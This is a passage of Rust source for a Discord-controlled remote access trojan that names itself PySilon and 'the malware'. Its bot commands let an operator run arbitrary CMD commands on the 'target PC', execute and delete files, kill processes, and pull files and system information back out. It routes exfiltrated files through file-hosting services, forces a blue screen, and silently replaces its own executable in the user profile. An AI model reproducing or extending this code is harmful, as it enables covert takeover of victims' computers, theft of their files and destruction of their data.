                        let path= format!("{}/{}.txt", std::env::temp_dir().to_string_lossy(), &Alphanumeric.sample_string(&mut rand::thread_rng(), 12));
                        let mut f= BufWriter::new(File::create(&path).await.unwrap());
                        f.write_all(string.as_bytes()).await.unwrap();
                        f.flush().await.unwrap();
                        drop(f);
                        BOT_TO_SEND.lock().await.push(json!({
                            "channel": channelid,
                            "content": &format!("```CPU Information requested by {}```", user),
                            "files": [path],
                            "react": ["🔴"],
                            "delete_files": true
                        }));
                    }
                }
                _ => {
                    show_help= true;
                }
            }
        }else{
            show_help= true;
        }
        if show_help {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .show <action> [options]\nActions:\n    proc, processes - get the target PC's processes\n        Options: Sorting (default: name)\n            cpu - sort by highest cpu usage\n            mem - sort by highest ram usage\n            pid - sort by pids from the least to highest\n    sys, system - get the system information\n    net, network - get the network information\n    comp, components - get the registered component information\n    disk, disks - get the disks information\n    cpu, cpus - get the CPU's information```",
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn kill(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let mut show_help= false;
        let args= msg.content.split(' ').collect::<Vec<&str>>();
        if args.len()> 1 {
            let channelid= msg.channel_id.0;
            match args[1].parse::<u32>() {
                Ok(pid) => {
                    tokio::spawn(async move {
                        processes::kill_process(channelid, pid).await;
                    });
                }
                Err(_) => {
                    show_help= true;
                }
            }
        }
        if show_help {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .kill <pid>\nPid:\n    The process ID on the target's PC to kill```",
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn pwd(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() && msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```You are right now in: {}```", std::env::current_dir().unwrap().to_string_lossy()),
                "react": ["🔴"]
            }));
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn tree(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() && msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
            let channelid= msg.channel_id.0;
            let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
            tokio::spawn(async move {
                tree::main(channelid, user).await;
            });
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn proxy(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let mut show_help= false;
        let mut args= msg.content.split(' ').collect::<Vec<&str>>();
        if args.len()<= 1 {
            show_help= true;
        }else{
            match args[1] {
                "list" => {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": &format!("```The current proxies are: \"{}\"```", PROXIES.lock().await.join(", ")),
                        "react": ["🔴"]
                    }));
                    return Ok(());
                }
                "every_file" => {
                    let cur= *PROXY_ALL.lock().await;
                    *PROXY_ALL.lock().await= !cur;
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": if cur {
                            "```❗ Now not proxying every files.```".to_string()
                        }else{
                            "```❗ Now proxying every files.```".to_string()
                        },
                        "react": ["🔴"]
                    }));
                    registry::update_proxies().await;
                    return Ok(());
                }
                _ => {

                }
            }
            if args[1]== "list" {
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": &format!("```The current proxies are: \"{}\"```", PROXIES.lock().await.join(", ")),
                    "react": ["🔴"]
                }));
                return Ok(());
            }else{
                PROXIES.lock().await.clear();
            }
        }
        while args.len()> 1 {
            let name= args.remove(1);
            match name {
                "gofile" | "pixeldrain" | "anonfiles" => {
                    PROXIES.lock().await.push(name.to_string());
                }
                _ => {
                    show_help= true;
                    if PROXIES.lock().await.len()== 0 {
                        PROXIES.lock().await.push("pixeldrain".to_string());
                    }
                    break;
                }
            }
        }
        registry::update_proxies().await;
        if show_help {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .proxy <proxy/list/every_file> [proxy] ...\nProxy: Servers for uploading files\n    gofile - 25> MiB\n    pixeldrain - 25> MiB, 19.5< GiB\n    anonfiles - 25> MiB, 20< GiB\nList: List current proxies.\nEvery_file: Toggle proxy every uploaded file.```",
                "react": ["🔴"]
            }));
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```Set proxies to: \"{}\"```", PROXIES.lock().await.join(", ")),
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn ls(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() && msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
            let channelid= msg.channel_id.0;
            let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
            tokio::spawn(async move {
                tree::main_ls(channelid, user).await;
            });
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn cd(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() && msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
            let args= msg.content.split(' ').collect::<Vec<&str>>();
            if args.len()> 1 {
                let channelid= msg.channel_id.0;
                let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                let arg= args[1..].join(" ");
                tokio::spawn(async move {
                    tree::main_cd(channelid, user, arg).await;
                });
            }else{
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": "```Syntax: .cd <dir> \nDirectory (dir): Directory to go to```",
                    "react": ["🔴"]
                }));
            }
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn download(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() && msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
            let args= msg.content.split(' ').collect::<Vec<&str>>();
            if args.len()<= 1 {
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": "```Syntax: .download <file/dir>\nFile/Directory (dir): Target to download files```",
                    "react": ["🔴"]
                }));
            }else{
                let channelid= msg.channel_id.0;
                let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                let input= args[1..].join(" ");
                tokio::spawn(async move {
                    download::main(channelid, user, input, false).await;
                });
            }
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn download_tar(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() && msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
            let args= msg.content.split(' ').collect::<Vec<&str>>();
            if args.len()<= 1 {
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": "```Syntax: .download_tar <file/dir>\nFile/Directory (dir): Target to download files```",
                    "react": ["🔴"]
                }));
            }else{
                let channelid= msg.channel_id.0;
                let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                let input= args[1..].join(" ");
                tokio::spawn(async move {
                    download::main(channelid, user, input, true).await;
                });
            }
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn execute(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() && msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
            let args= msg.content.split(' ').collect::<Vec<&str>>();
            if args.len()<= 1 {
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": "```Syntax: .execute <file>\nFile: Target to run a file```",
                    "react": ["🔴"]
                }));
            }else{
                let channelid= msg.channel_id.0;
                let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                let input= args[1..].join(" ");
                tokio::spawn(async move {
                    processes::main_execute(channelid, user, input).await;
                });
            }
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn cmd(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        let args= msg.content.split(' ').collect::<Vec<&str>>();
        if args.len()<= 1 {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```Syntax: .cmd <command>\nCommand: Run a CMD command```",
                "react": ["🔴"]
            }));
        }else{
            let channelid= msg.channel_id.0;
            let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
            let input= args[1..].join(" ");
            tokio::spawn(async move {
                processes::main_cmd(channelid, user, input).await;
            });
        }
    }
    Ok(())
}
#[command]
async fn remove(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() && msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
            let args= msg.content.split(' ').collect::<Vec<&str>>();
            if args.len()<= 1 {
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": "```Syntax: .remove <file/dir>\nFile/Directory (dir): Remove a File or Directory```",
                    "react": ["🔴"]
                }));
            }else{
                let channelid= msg.channel_id.0;
                let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                let input= args[1..].join(" ");
                tokio::spawn(async move {
                    tree::main_remove(channelid, user, input).await;
                });
            }
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn upload(ctx: &Context, msg: &Message) -> CommandResult {
    if CHANNEL_IDS.lock().await["file"].is_some() && msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.channel_id.0== *CHANNEL_IDS.lock().await["file"].as_ref().unwrap() {
            let args= msg.content.split(' ').collect::<Vec<&str>>();
            if args.len()<= 1 && msg.attachments.is_empty() {
                BOT_TO_SEND.lock().await.push(json!({
                    "channel": msg.channel_id.0,
                    "content": "```Syntax: .upload <attachment/proxy_url>\nAttachment/URL: Upload a file into the target PC```",
                    "react": ["🔴"]
                }));
            }else{
                let mut files= Vec::new();
                if args.len()> 1 {
                    files.push(args[1..].join(" "));
                }
                for attachment in &msg.attachments {
                    files.push(attachment.url.clone());
                }
                for url in files {
                    let channelid= msg.channel_id.0;
                    let user= format!("{}#{:04}", msg.author.name, msg.author.discriminator);
                    let input= url;
                    tokio::spawn(async move {
                        upload::main_upload(channelid, user, input).await;
                    });
                }
            }
        }else{
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": &format!("```❗ This command works only on file-related channel: ```<#{}>", *CHANNEL_IDS.lock().await["file"].as_ref().unwrap()),
                "react": ["🔴"]
            }));
        }
    }
    Ok(())
}
#[command]
async fn implode(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.attachments.is_empty() {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```❗ You need to upload the key generated along the malware to get authorization.```",
                "react": ["🔴"]
            }));
        }else{
            match reqwest::get(&msg.attachments[0].url).await {
                Ok(request) => {
                    match request.bytes().await {
                        Ok(bytes) => {
                            let mut is_valid= false;
                            let buf= bytes.to_vec();
                            if PYSILON_KEY.len()== buf.len() {
                                is_valid= true;
                                for i in 0..PYSILON_KEY.len() {
                                    if PYSILON_KEY[i]!= buf[i] {
                                        is_valid= false;
                                        break;
                                    }
                                }
                            }
                            if is_valid {
                                BOT_TO_SEND.lock().await.push(json!({
                                    "channel": msg.channel_id.0,
                                    "content": "```You are authorized to remotely remove PySilon from the target PC. Everything related to PySilon will be erased after you confirm this action by reacting with \"💀\".\n❗ Warning ❗ This cannot be undone after you decide to proceed. You can cancel it, by reacting with \"🔴\".```",
                                    "react": ["💀", "🔴"],
                                    "interaction": {
                                        "kind": "implode"
                                    }
                                }));
                            }else{
                                BOT_TO_SEND.lock().await.push(json!({
                                    "channel": msg.channel_id.0,
                                    "content": "```You are not authorized to remotely remove PySilon from the target PC.```",
                                    "react": ["🔴"]
                                }));
                            }
                        }
                        Err(e) => {
                            BOT_TO_SEND.lock().await.push(json!({
                                "channel": msg.channel_id.0,
                                "content": format!("```❗ An error occurred while fetching the key: {}```", e),
                                "react": ["🔴"]
                            }));
                        }
                    }
                }
                Err(e) => {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": format!("```❗ An error occurred while fetching the key: {}```", e),
                        "react": ["🔴"]
                    }));
                }
            }
        }
    }
    Ok(())
}
#[command]
async fn update(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        if msg.attachments.len()< 2 {
            BOT_TO_SEND.lock().await.push(json!({
                "channel": msg.channel_id.0,
                "content": "```❗ You need to upload the key generated along the malware to get authorization to update, and the new executable file.\nThe key should be the first file, then the executable file should be after it (second file).```",
                "react": ["🔴"]
            }));
        }else{
            match reqwest::get(&msg.attachments[0].url).await {
                Ok(request) => {
                    match request.bytes().await {
                        Ok(bytes) => {
                            let mut is_valid= false;
                            let buf= bytes.to_vec();
                            if PYSILON_KEY.len()== buf.len() {
                                is_valid= true;
                                for i in 0..PYSILON_KEY.len() {
                                    if PYSILON_KEY[i]!= buf[i] {
                                        is_valid= false;
                                        break;
                                    }
                                }
                            }
                            if is_valid {
                                match reqwest::get(&msg.attachments[1].url).await {
                                    Ok(request) => {
                                        match request.bytes().await {
                                            Ok(bytesr) => {
                                                BOT_TO_SEND.lock().await.push(json!({
                                                    "channel": msg.channel_id.0,
                                                    "content": format!("```❗ Now updating, it might take a bit to do so.```")
                                                }));
                                                let path= std::env::temp_dir().to_string_lossy().to_string() + &Alphanumeric.sample_string(&mut rand::thread_rng(), 12);
                                                match File::create(&path).await {
                                                    Ok(f) => {
                                                        let mut f= BufWriter::new(f);
                                                        let mut start= true;
                                                        if let Err(e)= f.write_all(&bytesr).await {
                                                            start= false;
                                                            BOT_TO_SEND.lock().await.push(json!({
                                                                "channel": msg.channel_id.0,
                                                                "content": format!("```❗ An error occurred while updating: {}```", e)
                                                            }));
                                                        }else if let Err(e)= f.flush().await {
                                                            start= false;
                                                            BOT_TO_SEND.lock().await.push(json!({
                                                                "channel": msg.channel_id.0,
                                                                "content": format!("```❗ An error occurred while updating: {}```", e)
                                                            }));
                                                        }
                                                        drop(f);
                                                        if start {
                                                            let to_path= std::env::var_os("USERPROFILE").unwrap().to_string_lossy().to_string() + "\\" + &SOFTWARE_DIRECTORY_NAME.lock().await.to_lowercase() + "\\" + &SOFTWARE_EXECUTABLE_NAME.lock().await.to_lowercase() + ".exe";
                                                            let _= Command::new("cmd.exe").creation_flags(0x08000000)
                                                                .raw_arg(format!("/c taskkill /f /pid {} && copy \"{path}\" \"{to_path}\" && \"{to_path}\"", std::process::id()))
                                                                .spawn();
                                                        }
                                                    }
                                                    Err(e) => {
                                                        BOT_TO_SEND.lock().await.push(json!({
                                                            "channel": msg.channel_id.0,
                                                            "content": format!("```❗ An error occurred while updating: {}```", e)
                                                        }));
                                                    }
                                                }
                                            }
                                            Err(e) => {
                                                BOT_TO_SEND.lock().await.push(json!({
                                                    "channel": msg.channel_id.0,
                                                    "content": format!("```❗ An error occurred while fetching the executable: {}```", e),
                                                    "react": ["🔴"]
                                                }));
                                            }
                                        }
                                    }
                                    Err(e) => {
                                        BOT_TO_SEND.lock().await.push(json!({
                                            "channel": msg.channel_id.0,
                                            "content": format!("```❗ An error occurred while fetching the executable: {}```", e),
                                            "react": ["🔴"]
                                        }));
                                    }
                                }
                            }else{
                                BOT_TO_SEND.lock().await.push(json!({
                                    "channel": msg.channel_id.0,
                                    "content": "```You are not authorized to remotely update PySilon from the target PC.\nRemember that you first have to put the key (as an attachment), and then the executable.```",
                                    "react": ["🔴"]
                                }));
                            }
                        }
                        Err(e) => {
                            BOT_TO_SEND.lock().await.push(json!({
                                "channel": msg.channel_id.0,
                                "content": format!("```❗ An error occurred while fetching the key: {}```", e),
                                "react": ["🔴"]
                            }));
                        }
                    }
                }
                Err(e) => {
                    BOT_TO_SEND.lock().await.push(json!({
                        "channel": msg.channel_id.0,
                        "content": format!("```❗ An error occurred while fetching the key: {}```", e),
                        "react": ["🔴"]
                    }));
                }
            }
        }
    }
    Ok(())
}
#[command]
async fn bsod(ctx: &Context, msg: &Message) -> CommandResult {
    if msg.channel_id.edit(&ctx, |c| c).await.unwrap().parent_id.unwrap().edit(&ctx, |c| c).await.unwrap().name()== *CATEGORY_NAME.lock().await {
        let _= msg.delete(ctx).await;
        BOT_TO_SEND.lock().await.push(json!({
            "channel": msg.channel_id.0,
            "content": format!("```Do you really want to BSOD the target PC?\nReact with 💀 to make it BSOD or 🔴 to cancel```"),
            "react": ["💀", "🔴"],
            "interaction": {
                "kind": "bsod"
            }
        }));
    }
    Ok(())
}